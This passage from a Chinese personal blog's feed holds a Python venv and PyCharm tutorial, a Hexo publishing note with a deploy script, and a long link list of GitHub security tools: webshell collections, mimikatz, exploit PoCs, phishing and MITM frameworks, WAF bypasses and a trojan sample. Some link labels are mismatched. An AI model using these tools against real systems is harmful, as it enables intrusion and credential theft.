    <content type="html"><![CDATA[<h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>众所周知，项目的环境管理一直是比较头疼的问题，如果有两个项目，一个用的是 a 库的 v1 版本，一个用的是 a 库的 v2 版本，那么如果 a 库是安装在系统环境下的，就会出现项目所依赖的库文件版本不对的问题。</p><p>Python 社区为了解决这个问题，提出了虚拟环境的概念。也就是人为的创建一个虚拟环境供项目运行，而该项目需要什么库文件，则自行在这个虚拟环境中下载安装，而在虚拟环境中下载安装的库文件，是不会影响到系统环境中的库文件的。有了虚拟环境的概念， Python 的项目管理也就不那么麻烦了。</p><p>接下来，我来总结下如何使用 Python 的虚拟环境。</p><p>ps: 以下的讲解都是在 Python3 的前提之下。</p><a id="more"></a><h2 id="二、venv"><a href="#二、venv" class="headerlink" title="二、venv"></a>二、venv</h2><p>鉴于 Python3 中以标准库的形式包含了 venv 工具，因此就不再讲解 venv 工具的安装了。</p><p>不过 Ubuntu 环境是需要自行下载安装的，运行命令如下：</p><p>$ sudo apt-get install python3-venv</p><p><strong>1. 创建虚拟环境</strong><br>这里，假定你已经拥有了 venv 工具，我们直接打开命令行工具</p><p>Windows 平台下运行：</p><pre><code>py -3 -m venv venv</code></pre><p>MacOS 或者 Linux 平台下运行：</p><pre><code>python3 -m venv venv</code></pre><p>运行完这行命令，应该可以在当前目录下看到新建的一个文件夹，名为 venv，其就是虚拟环境的名称，并且以后我们在虚拟环境中所有的操作以及下载的库文件，都会在这个文件夹中。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDkvMTkvUm5QYjFXRFRndkdNa0N5LnBuZw?x-oss-process=image/format,png" alt="20180720185730986.png"></p><p><strong>2. 激活虚拟环境</strong><br>创建了虚拟环境却没有激活的话，你还是处于系统环境中。怎么激活虚拟环境呢？</p><p>Windows 平台下运行：</p><pre><code>venv\Scripts\activate</code></pre><p>MacOS 或者 Linux 平台下运行：</p><pre><code>source venv/bin/activate</code></pre><p>这里 venv 是你的虚拟环境的名字。运行完之后，自动会刷新命令行界面，以括号内嵌虚拟环境名字的形式提示用户，现在是处于 venv 虚拟环境中。</p><p><strong>3. 使用虚拟环境</strong><br>虚拟环境除了 Python 一些核心的包、pip 工具等等，其他都没有，因此，当前项目需要什么，则使用 pip 工具下载即可。</p><p>其他的使用方法，与系统环境下的使用没有什么不同。</p><p><strong>4. 退出虚拟环境</strong><br>退出虚拟环境很简单，各平台都是一样的：</p><pre><code>deactivate</code></pre><p>从虚拟环境中退出到系统环境是很明显的，因为前面的虚拟环境名称提示符消失了。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDkvMTkvaEw4V1ZhMlMxbnhpckhDLnBuZw?x-oss-process=image/format,png" alt="20180720190201469.png"></p><h2 id="三、在-PyCharm-中配置当前项目虚拟环境"><a href="#三、在-PyCharm-中配置当前项目虚拟环境" class="headerlink" title="三、在 PyCharm 中配置当前项目虚拟环境"></a>三、在 PyCharm 中配置当前项目虚拟环境</h2><p>venv 是很好用，但是我们该如何在 PyCharm 中配置当前项目所使用的环境呢？</p><ol><li><p>进入 Project Interpreter 界面<br>我们打开 PyCharm，菜单栏选择 File，点击 Settings，进入到设置界面，然后配置 Project Interpreter<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDkvMTkvTUo1Z05kY3NIWXVBeDZTLnBuZw?x-oss-process=image/format,png" alt="20180720190548991.png"></p></li><li><p>添加虚拟环境<br>在 Project Interpreter 文本框右侧点击齿轮按钮，点击 Add。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDkvMTkvZDFmNWNCWVdBQ0RlcXdJLnBuZw?x-oss-process=image/format,png" alt="20180720190956776.png"><br>然后，选择 Virtualenv Environment 标签卡，选择 Existing enviroment（选择上面那个应该可以直接新建一个环境，这里为了续接上一节中的环境，则直接选择了已存在的环境），这里，如果 PyCharm 没有找到你新建的环境，则需要你自己去打开文件找到你虚拟环境中的 Scripts 目录下的 python.exe 解释器文件。</p></li><li><p>测试运行<br>最后点击 OK，即可看到环境列表多了一行。这里，我们可以在项目中切换各个环境进行自己当前项目的测试，还是很方便的。</p></li></ol><p>四、总结<br>在系统环境中，使用最基本的 Python 解释器提供虚拟环境 venv 的功能，然后在各个虚拟环境中完成我们的项目，这样是比较好的项目组织方式。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、引言&quot;&gt;&lt;a href=&quot;#一、引言&quot; class=&quot;headerlink&quot; title=&quot;一、引言&quot;&gt;&lt;/a&gt;一、引言&lt;/h2&gt;&lt;p&gt;众所周知，项目的环境管理一直是比较头疼的问题，如果有两个项目，一个用的是 a 库的 v1 版本，一个用的是 a 库的 v2 版本，那么如果 a 库是安装在系统环境下的，就会出现项目所依赖的库文件版本不对的问题。&lt;/p&gt;
&lt;p&gt;Python 社区为了解决这个问题，提出了虚拟环境的概念。也就是人为的创建一个虚拟环境供项目运行，而该项目需要什么库文件，则自行在这个虚拟环境中下载安装，而在虚拟环境中下载安装的库文件，是不会影响到系统环境中的库文件的。有了虚拟环境的概念， Python 的项目管理也就不那么麻烦了。&lt;/p&gt;
&lt;p&gt;接下来，我来总结下如何使用 Python 的虚拟环境。&lt;/p&gt;
&lt;p&gt;ps: 以下的讲解都是在 Python3 的前提之下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="python" scheme="http://austfish.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客文章发布流程记录</title>
    <link href="http://austfish.cn/2019/09/19/Hexo%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0%E5%8F%91%E5%B8%83%E6%B5%81%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    <id>http://austfish.cn/2019/09/19/Hexo博客文章发布流程记录/</id>
    <published>2019-09-19T03:52:04.000Z</published>
    <updated>2022-02-18T03:34:20.968Z</updated>
    
    <content type="html"><![CDATA[<p>Hexo博客发布文章步骤：<br>1.新建文章<br>2.编辑内容<br>3.发布</p><a id="more"></a><h2 id="新建-hello-文件"><a href="#新建-hello-文件" class="headerlink" title="新建 hello 文件"></a>新建 hello 文件</h2><pre><code>hexo new &apos;hello&apos;</code></pre><h2 id="打开-hello-md-文件编辑"><a href="#打开-hello-md-文件编辑" class="headerlink" title="打开 hello.md 文件编辑"></a>打开 hello.md 文件编辑</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">layout: post</span><br><span class="line">title: 标题</span><br><span class="line">date: 时间</span><br><span class="line">tags:</span><br><span class="line">- 标签1</span><br><span class="line">- 标签2</span><br><span class="line">---</span><br><span class="line">摘要区域</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line">正文</span><br></pre></td></tr></table></figure><h2 id="发布博客"><a href="#发布博客" class="headerlink" title="发布博客"></a>发布博客</h2><pre><code>$ hexo d -g</code></pre><p>或者使用脚本</p><pre><code>./deploy</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">DIR=`dirname $0`</span><br><span class="line"></span><br><span class="line"># Generate blog</span><br><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">sleep 5</span><br><span class="line"></span><br><span class="line"># Deploy</span><br><span class="line">hexo deploy</span><br><span class="line">sleep 5</span><br><span class="line"></span><br><span class="line"># Push hexo code</span><br><span class="line">git add .</span><br><span class="line">current_date=`date &quot;+%Y-%m-%d %H:%M:%S&quot;`</span><br><span class="line">git commit -m &quot;Blog updated: $current_date&quot;</span><br><span class="line"></span><br><span class="line">sleep 2</span><br><span class="line">git push origin hexo</span><br><span class="line"></span><br><span class="line">echo &quot;=====&gt;Finish!&lt;=====&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hexo博客发布文章步骤：&lt;br&gt;1.新建文章&lt;br&gt;2.编辑内容&lt;br&gt;3.发布&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="记录" scheme="http://austfish.cn/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="手册" scheme="http://austfish.cn/tags/%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>Python工具库</title>
    <link href="http://austfish.cn/2019/08/29/Python%E5%B7%A5%E5%85%B7%E5%BA%93/"/>
    <id>http://austfish.cn/2019/08/29/Python工具库/</id>
    <published>2019-08-29T07:44:24.000Z</published>
    <updated>2022-02-18T03:34:21.137Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞及渗透练习平台<br>花式扫描器/信息搜集工具/WEB/windows域渗透工具<br>Fuzz/漏洞利用及攻击框架/漏洞POC&amp;EXP/中间人攻击及钓鱼<br>密码破解/二进制及代码分析工具/二进制静态分析工具（python）<br>EXP编写框架及工具/隐写/各类CTF资源/各类编程资源/Python<br>科学上网/福利/甲方安全工程师生存指南/蜜罐/远控</strong><br><a id="more"></a></p><h2 id="漏洞及渗透练习平台："><a href="#漏洞及渗透练习平台：" class="headerlink" title="漏洞及渗透练习平台："></a>漏洞及渗透练习平台：</h2><p>WebGoat漏洞练习平台：<br><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a><br>webgoat-legacy漏洞练习平台:<br><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a><br>zvuldirll漏洞练习平台：<br><a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">https://github.com/710leo/ZVulDrill</a><br>vulapps漏洞练习平台：<br><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a><br>dvwa漏洞练习平台：<br><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a><br>数据库注入练习平台 ：<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a><br>用node编写的漏洞练习平台，like OWASP Node Goat：<br><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a><br>Ruby编写的一款工具，生成含漏洞的虚拟机：<br><a href="https://github.com/cliffe/secgen" target="_blank" rel="noopener">https://github.com/cliffe/secgen</a></p><h2 id="花式扫描器-："><a href="#花式扫描器-：" class="headerlink" title="花式扫描器 ："></a>花式扫描器 ：</h2><p>Nmap端口扫描器：<br><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a><br>本地网络扫描器：<br><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a><br>子域名扫描器：<br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a><br><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a><br>linux漏洞扫描：<br><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a><br>基于端口扫描以及关联CVE:<br><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a><br>漏洞路由扫描器：<br><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a><br>迷你批量信息泄漏扫描脚本：<br><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a><br>Waf类型检测工具：<br><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a><br>服务器端口弱口令扫描器：<br><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a><br>Fox-scan扫描器：<br><a href="https://github.com/fengxuangit/Fox-scan/" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan/</a></p><h2 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具 :"></a>信息搜集工具 :</h2><p>社工收集器：<br><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a><br>Github信息搜集：<br><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a><br>github Repo信息搜集工具：<br><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a><br>信息探测及扫描工具：<br><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a><br>内部网络信息扫描器：<br><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a><br>远程桌面登录扫描器：<br><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a><br>网络基础设施渗透工具<br><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a><br>SNMAP密码破解:<br><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p><h2 id="WEB："><a href="#WEB：" class="headerlink" title="WEB："></a>WEB：</h2><p>webshell大合集：<br><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a><br>渗透以及web攻击脚本：<br><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a><br>web渗透小工具大合集：<br><a href="https://github.com/rootphantomer/hacktoolsfor_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hacktoolsfor_me</a><br>XSS数据接收平台：<br><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a><br>XSS与CSRF工具：<br><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a><br>xss多功能扫描器：<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>web漏洞扫描器:<br><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a><br>WEB漏洞扫描器：<br><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a><br>渗透常用小工具包：<br><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a><br>web目录扫描器:<br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a><br>web向命令注入检测工具：<br><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a><br>自动化SQL注入检查工具：<br><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a><br>SSL扫描器：<br><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a><br>安全工具集合：<br><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a><br>apache日志分析器：<br><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a><br>php代码审计工具：<br><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a><br>web指纹识别扫描：<br><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a><br>检查网站恶意攻击：<br><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a><br>wordprees漏洞扫描器：<br><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a><br>固件漏洞扫描器：<br><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a><br>数据库注入工具<br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a><br>Web代理：<br><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a><br>新版中国菜刀：<br><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a><br>git泄露利用EXP：<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a><br>浏览器攻击框架：<br><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a><br>自动化绕过WAF脚本：<br><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a><br>一款开源WAF：<br><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a><br>http命令行客户端：<br><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a><br>浏览器调试利器：<br><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a><br>DISCUZ漏洞扫描器：<br><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a><br>自动化代码审计工具<br><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a><br>浏览器攻击框架：<br><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a><br>tomcat自动后门部署：<br><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a><br>网络空间指纹扫描器：<br><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a><br>burpsuit之J2EE扫描插件：<br><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p><h2 id="windows域渗透工具："><a href="#windows域渗透工具：" class="headerlink" title="windows域渗透工具："></a>windows域渗透工具：</h2><p>mimikatz明文注入：<br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a><br>Powershell渗透库合集：<br><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a><br>Powershell tools合集：<br><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a><br>powershell的mimikittenz:<br><a href="https://github.com/putterpanda/mimikittenz" target="_blank" rel="noopener">https://github.com/putterpanda/mimikittenz</a><br>域渗透教程:<br><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz:"></a>Fuzz:</h2><p>Web向Fuzz工具<br><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a><br>HTTP暴力破解，撞库攻击脚本<br><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h2 id="漏洞利用及攻击框架："><a href="#漏洞利用及攻击框架：" class="headerlink" title="漏洞利用及攻击框架："></a>漏洞利用及攻击框架：</h2><p>msf框架：<br><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a><br>pocsscan攻击框架：<br><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a><br>Pocsuite攻击框架:<br><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a><br>Beebeeto攻击框架：<br><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h2 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP:"></a>漏洞POC&amp;EXP:</h2><p>ExploitDB官方git版本:<br><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a><br>php漏洞代码分析：<br><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a><br>CVE-2016-2107:<br><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a><br>CVE-2015-7547 POC：<br><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a><br>JAVA反序列化POC生成工具:<br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a><br>JAVA反序列化EXP:<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a><br>Jenkins CommonCollections EXP:<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a><br>CVE-2015-2426 EXP (windows内核提权):<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a><br>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):<br><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a><br>php7缓存覆写漏洞Demo及相关工具:<br><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a><br>XcodeGhost木马样本:<br><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h2 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h2><p>中间人攻击框架:<br><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a><br>Inject code, jam wifi, and spy on wifi users:<br><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a><br>中间人代理工具:<br><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a><br>wifi钓鱼:<br><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h2 id="密码破解："><a href="#密码破解：" class="headerlink" title="密码破解："></a>密码破解：</h2><p>密码破解工具:<br><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a><br>本地存储的各类密码提取利器:<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h2 id="二进制及代码分析工具："><a href="#二进制及代码分析工具：" class="headerlink" title="二进制及代码分析工具："></a>二进制及代码分析工具：</h2><p>二进制分析工具<br><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a><br>系统扫描器<br><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a><br>rp:<br><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a><br>Windows Exploit Development工具<br><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><h2 id="二进制静态分析工具（python）"><a href="#二进制静态分析工具（python）" class="headerlink" title="二进制静态分析工具（python）:"></a>二进制静态分析工具（python）:</h2><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a><br>Python Exploit Development Assistance for GDB:<br><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a><br>对BillGates Linux Botnet系木马活动的监控工具<br><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a><br>木马配置参数提取工具:<br><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a><br>Shellphish编写的二进制分析工具（CTF向）:<br><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a><br>针对python的静态代码分析工具:<br><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a><br>一个自动化的脚本（shell）分析工具，用来给出警告和建议:<br><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a><br>基于AST变换的简易Javascript反混淆辅助工具:<br><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h2 id="EXP编写框架及工具："><a href="#EXP编写框架及工具：" class="headerlink" title="EXP编写框架及工具："></a>EXP编写框架及工具：</h2><p>二进制EXP编写工具:<br><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a><br>CTF Pwn 类题目脚本编写框架:<br><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a><br>an easy-to-use io library for pwning development:<br><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a><br>跨平台注入工具:<br><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a><br>哈希长度扩展攻击EXP：<br><a href="https://github.com/citronneur/rdpy" target="_blank" rel="noopener">https://github.com/citronneur/rdpy</a></p><h2 id="隐写："><a href="#隐写：" class="headerlink" title="隐写："></a>隐写：</h2><p>隐写检测工具<br><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h2 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料:"></a>各类安全资料:</h2><p>data_hacking合集:<br><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a><br>mobile-security-wiki:<br><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a><br>书籍《reverse-engineering-for-beginners》:<br><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a><br>一些信息安全标准及设备配置:<br><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a><br>APT相关笔记:<br><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a><br>Kcon资料:<br><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a><br>《DO NOT FUCK WITH A HACKER》:<br><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a><br>各类安全脑洞图：<br><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a><br>信息安全流程图：<br><a href="https://github.com/SecWiki/sec-chart/" target="_blank" rel="noopener">https://github.com/SecWiki/sec-chart/</a> tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</p><h2 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h2><p>近年ctf writeup大全:<br><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015" target="_blank" 